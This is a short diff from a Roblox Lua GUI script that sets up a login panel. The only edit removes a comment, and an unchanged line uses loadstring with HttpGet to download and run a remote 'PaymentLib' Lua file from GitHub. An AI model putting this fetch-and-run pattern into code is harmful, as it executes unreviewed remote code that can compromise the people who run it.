@@ -92,7 +92,7 @@ Exit.TextColor3 = Color3.fromRGB(189, 0, 0)
 Exit.TextSize = 14.000
 
 UICorner_5.Parent = Exit
-local function AODF_fake_script() -- Login_2.LocalScript
+local function AODF_fake_script()
 	local script = Instance.new('LocalScript', Login_2)
 
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/ArmorCodedIt/Roblox-PaymentLib/main/Library/lib.lua"))()
